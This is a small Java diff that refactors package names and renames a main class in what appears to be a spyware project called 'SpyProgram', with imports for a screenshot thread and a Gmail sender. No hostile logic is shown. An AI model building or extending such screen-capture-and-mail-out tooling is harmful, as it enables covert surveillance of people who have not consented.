@@ -1,11 +1,12 @@
-import SpyCode.SendMail.GMailer;
-import Threads.PrntScreenThread;
+package com.KostiantynBoiar.SpyProgram;
+
+import com.KostiantynBoiar.SpyProgram.SpyCode.SendMail.GMailer;
+import com.KostiantynBoiar.SpyProgram.Threads.PrntScreenThread;
 
 import java.io.File;
-import java.util.ArrayList;
-import java.util.List;
 
-public class Main extends PrntScreenThread {
+
+public class MainClassSpy extends PrntScreenThread {
 
     static PrntScreenThread threadOfPrntScreenClass;
 
